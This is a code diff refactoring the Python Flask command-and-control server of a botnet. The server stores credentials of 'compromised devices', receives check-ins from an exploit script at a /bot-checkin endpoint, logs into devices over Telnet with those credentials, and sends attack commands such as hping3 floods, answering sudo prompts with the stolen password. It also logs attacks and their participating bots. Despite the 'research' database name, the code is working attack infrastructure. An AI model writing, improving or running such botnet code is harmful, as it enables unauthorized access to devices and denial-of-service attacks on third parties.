@@ -57,18 +57,10 @@ def init_database():
             target_ip TEXT,
             attack_type TEXT,
             timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            status TEXT DEFAULT 'pending'
+            status TEXT DEFAULT 'pending',
+            bot_ip TEXT
         )
     ''')
-    
-    # Add bot_ip column if it doesn't exist
-    try:
-        cursor.execute('ALTER TABLE commands ADD COLUMN bot_ip TEXT')
-        conn.commit()
-        logging.info("Added bot_ip column to commands table")
-    except sqlite3.OperationalError:
-        # Column already exists
-        pass
     
     # Table for attack logs (scan results)
     cursor.execute('''
@@ -78,12 +70,18 @@ def init_database():
             port INTEGER,
             service TEXT,
             credentials TEXT,
-            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            attack_type TEXT,
+            target TEXT,
+            start_time TIMESTAMP,
+            participating_bots INTEGER,
+            status TEXT
         )
     ''')
     
     conn.commit()
     conn.close()
+    logging.info("Database initialized successfully")
 
 class DatabaseManager:
     def __init__(self):
@@ -93,6 +91,7 @@ class DatabaseManager:
         return sqlite3.connect('research_db.sqlite')
     
     def register_device(self, ip, username, password):
+        """Register a compromised device"""
         with self.db_lock:
             conn = self.get_connection()
             cursor = conn.cursor()
@@ -100,7 +99,7 @@ class DatabaseManager:
                 cursor.execute('''
                     INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
                     VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
-                ''', (ip, username, password, 'online', datetime.now()))
+                ''', (ip, username, password))
                 conn.commit()
                 logging.info(f"Device registered: {ip} ({username})")
                 return True
@@ -111,6 +110,7 @@ class DatabaseManager:
                 conn.close()
     
     def update_device_status(self, ip, status):
+        """Update device status"""
         with self.db_lock:
             conn = self.get_connection()
             cursor = conn.cursor()
@@ -121,6 +121,7 @@ class DatabaseManager:
             conn.close()
     
     def get_all_devices(self):
+        """Get all devices from database"""
         conn = self.get_connection()
         cursor = conn.cursor()
         cursor.execute('SELECT * FROM devices')
@@ -129,6 +130,7 @@ class DatabaseManager:
         return devices
     
     def get_online_devices(self):
+        """Get only online devices"""
         conn = self.get_connection()
         cursor = conn.cursor()
         cursor.execute('SELECT * FROM devices WHERE status = "online"')
@@ -137,6 +139,7 @@ class DatabaseManager:
         return devices
     
     def log_attack(self, attack_type, target, participating_bots):
+        """Log attack information"""
         with self.db_lock:
             conn = self.get_connection()
             cursor = conn.cursor()
@@ -150,135 +153,96 @@ class DatabaseManager:
             return attack_id
 
     def execute_telnet_login_and_send(self, ip, username, password, command):
-        """Establish Telnet connection, log in, send the initial command (e.g., sudo hping3 ...), handle sudo, and return the active Telnet object."""
+        """Establish Telnet connection, login, and send command"""
         tn = None
         try:
             logging.info(f"Attempting Telnet connection to {ip}:23")
             tn = telnetlib.Telnet(ip, 23, timeout=25)
-            logging.info(f"Telnet connection to {ip} established.")
+            logging.info(f"Telnet connection to {ip} established")
 
-            # Read until login prompt (handle common variations)
-            login_prompt_patterns = [b"login: ", b"Username: "]
-            index, match, login_response = tn.expect(login_prompt_patterns, timeout=15)
-            logging.info(f"Read from {ip} (login prompt): {login_response.decode(errors='ignore')}")
-
-            if match:
-                tn.write(username.encode() + b"\n")
-                logging.info(f"Sent username {username} to {ip}")
-
-                # Read until password prompt (handle common variations)
-                password_prompt_patterns = [b"Password: ", b"password: "]
-                index, match, password_response = tn.expect(password_prompt_patterns, timeout=10)
-                logging.info(f"Read from {ip} (password prompt): {password_response.decode(errors='ignore')}")
-
-                if match:
-                    if password:
-                        tn.write(password.encode() + b"\n")
-                        logging.info(f"Sent password to {ip}")
-                    else:
-                        tn.write(b"\n")
-                        logging.warning(f"No password provided for {ip}, sent empty line.")
-
-                    # Wait for initial shell prompt after successful login
-                    shell_prompt_patterns = [b"\r\n$", b"\n$", b"\r\n#", b"\n#", b"\r\n>", b"\n>"]
-                    logging.info(f"Waiting for initial shell prompt on {ip}...")
-                    index, match, initial_shell_response = tn.expect(shell_prompt_patterns, timeout=15)
-                    logging.info(f"Read from {ip} (initial shell prompt): {initial_shell_response.decode(errors='ignore')}")
-
-                    if match:
-                        logging.info(f"Initial shell prompt detected on {ip}. Proceeding to send command.")
-                        time.sleep(1)
-
-                        # Read any immediate output
-                        immediate_output_after_prompt = tn.read_very_eager()
-                        if immediate_output_after_prompt:
-                            logging.info(f"Immediate output from {ip} after initial shell prompt: {immediate_output_after_prompt.decode(errors='ignore')}")
-
-                        # Send the command
-                        full_command = command
-                        logging.info(f"Sending command to {ip} via Telnet: {full_command}")
-                        tn.write(full_command.encode() + b"\n")
-                        logging.info(f"Command written to {ip}")
-
-                        time.sleep(2)
-                        logging.info(f"Waited 2 seconds after sending command to {ip}.")
-
-                        # Check for various responses
-                        hping3_startup_patterns = [b"HPING ", b"hping in flood mode"]
-                        sudo_prompt_pattern = b"[sudo] password for "
-                        shell_prompt_patterns = [b"\r\n$", b"\n$", b"\r\n#", b"\n#", b"\r\n>", b"\n>"]
-
-                        execution_patterns_after_cmd = [sudo_prompt_pattern] + hping3_startup_patterns + shell_prompt_patterns
-                        index_after_cmd, match_after_cmd, response_after_cmd = tn.expect(execution_patterns_after_cmd, timeout=20)
-
-                        logging.info(f"Read from {ip} (after sending command - expect): {response_after_cmd.decode(errors='ignore')}")
-
-                        if match_after_cmd:
-                            if sudo_prompt_pattern in match_after_cmd.group(0):
-                                logging.info(f"Sudo prompt detected on {ip}. Sending password.")
-                                tn.write(password.encode() + b"\n")
-                                # Wait for command execution
-                                time.sleep(2)
-                                final_response = tn.read_very_eager()
-                                logging.info(f"Final response from {ip}: {final_response.decode(errors='ignore')}")
-                                return tn
-                            elif any(pattern in match_after_cmd.group(0) for pattern in hping3_startup_patterns):
-                                logging.info(f"Hping3 startup detected on {ip}. Command executing successfully.")
-                                return tn
-                            else:
-                                logging.info(f"Shell prompt returned on {ip}. Command may have completed or failed.")
-                                return tn
-                        else:
-                            logging.warning(f"No expected response pattern found on {ip}.")
-                            return tn
-                    else:
-                        logging.error(f"No shell prompt detected on {ip} after login.")
-                        if tn:
-                            tn.close()
-                        return None
-                else:
-                    logging.error(f"No password prompt detected on {ip}.")
-                    if tn:
-                        tn.close()
-                    return None
-            else:
-                logging.error(f"No login prompt detected on {ip}.")
-                if tn:
-                    tn.close()
+            # Handle login prompt
+            login_patterns = [b"login: ", b"Username: "]
+            index, match, response = tn.expect(login_patterns, timeout=15)
+            
+            if not match:
+                logging.error(f"No login prompt detected on {ip}")
+                tn.close()
                 return None
 
-        except EOFError:
-            logging.error(f"Telnet connection to {ip} closed unexpectedly (EOF).")
-            if tn:
+            # Send username
+            tn.write(username.encode() + b"\n")
+            logging.info(f"Sent username to {ip}")
+
+            # Handle password prompt
+            password_patterns = [b"Password: ", b"password: "]
+            index, match, response = tn.expect(password_patterns, timeout=10)
+            
+            if not match:
+                logging.error(f"No password prompt detected on {ip}")
                 tn.close()
-            return None
+                return None
+
+            # Send password
+            tn.write((password or "").encode() + b"\n")
+            logging.info(f"Sent password to {ip}")
+
+            # Wait for shell prompt
+            shell_patterns = [b"$", b"#", b">"]
+            index, match, response = tn.expect(shell_patterns, timeout=15)
+            
+            if not match:
+                logging.error(f"No shell prompt detected on {ip}")
+                tn.close()
+                return None
+
+            # Send command
+            logging.info(f"Sending command to {ip}: {command}")
+            tn.write(command.encode() + b"\n")
+            time.sleep(2)
+
+            # Handle sudo prompt if needed
+            sudo_pattern = b"[sudo] password for"
+            hping_patterns = [b"HPING", b"hping in flood mode"]
+            
+            patterns = [sudo_pattern] + hping_patterns + shell_patterns
+            index, match, response = tn.expect(patterns, timeout=20)
+            
+            if match and sudo_pattern in match.group(0):
+                logging.info(f"Sudo prompt detected on {ip}, sending password")
+                tn.write(password.encode() + b"\n")
+                time.sleep(2)
+
+            logging.info(f"Command executed successfully on {ip}")
+            return tn
+
         except Exception as e:
-            logging.error(f"Failed during Telnet interaction with {ip}: {e}")
+            logging.error(f"Telnet execution failed for {ip}: {e}")
             if tn:
-                tn.close()
+                try:
+                    tn.close()
+                except:
+                    pass
             return None
 
     def stop_telnet_session(self, ip, tn):
-        """Send stop signals and close the Telnet session."""
+        """Stop telnet session gracefully"""
         try:
             logging.info(f"Stopping Telnet session for {ip}")
-            # Send Ctrl+C to interrupt any running command
-            tn.write(b"\x03")
+            # Send interrupt signals
+            tn.write(b"\x03")  # Ctrl+C
             time.sleep(1)
-            # Send Ctrl+Z to suspend if needed
-            tn.write(b"\x1a")
+            tn.write(b"\x1a")  # Ctrl+Z
             time.sleep(1)
-            # Close the connection
             tn.close()
             logging.info(f"Telnet session closed for {ip}")
-        except EOFError:
-            logging.info(f"Telnet connection for {ip} already closed (EOF)")
+            return True
         except Exception as e:
             logging.error(f"Error stopping Telnet session for {ip}: {e}")
             try:
                 tn.close()
             except:
                 pass
+            return False
 
 # Global variables
 db_manager = DatabaseManager()
@@ -485,28 +449,27 @@ def index():
 
 @app.route('/bot-checkin', methods=['POST'])
 def bot_checkin():
-    """Handle bot check-in"""
+    """Handle bot check-in and device registration"""
     try:
         data = request.json
+        if not data:
+            return jsonify({'error': 'No data provided'}), 400
+            
         bot_ip = data.get('ip')
-        status = data.get('status', 'active')
-        # Get username and password from the incoming data (sent by exploit.py)
         username = data.get('username')
         password = data.get('password')
+        status = data.get('status', 'online')
 
         if not bot_ip:
             return jsonify({'error': 'Missing bot IP'}), 400
 
-        # Update bot status and store credentials in database
-        conn = sqlite3.connect('research_db.sqlite')
-        cursor = conn.cursor()
-        # Corrected INSERT OR REPLACE to provide 4 bindings for the 4 placeholders (ip, username, password, status)
-        cursor.execute('''INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
-                    VALUES (?, ?, ?, ?, datetime('now'))''', (bot_ip, username, password, status))
-        conn.commit()
-        conn.close()
-
-        return jsonify({'status': 'success'})
+        # Register device with credentials
+        success = db_manager.register_device(bot_ip, username, password)
+        
+        if success:
+            return jsonify({'status': 'success', 'message': 'Device registered successfully'})
+        else:
+            return jsonify({'error': 'Failed to register device'}), 500
 
     except Exception as e:
         logging.error(f"Error in bot check-in: {e}")
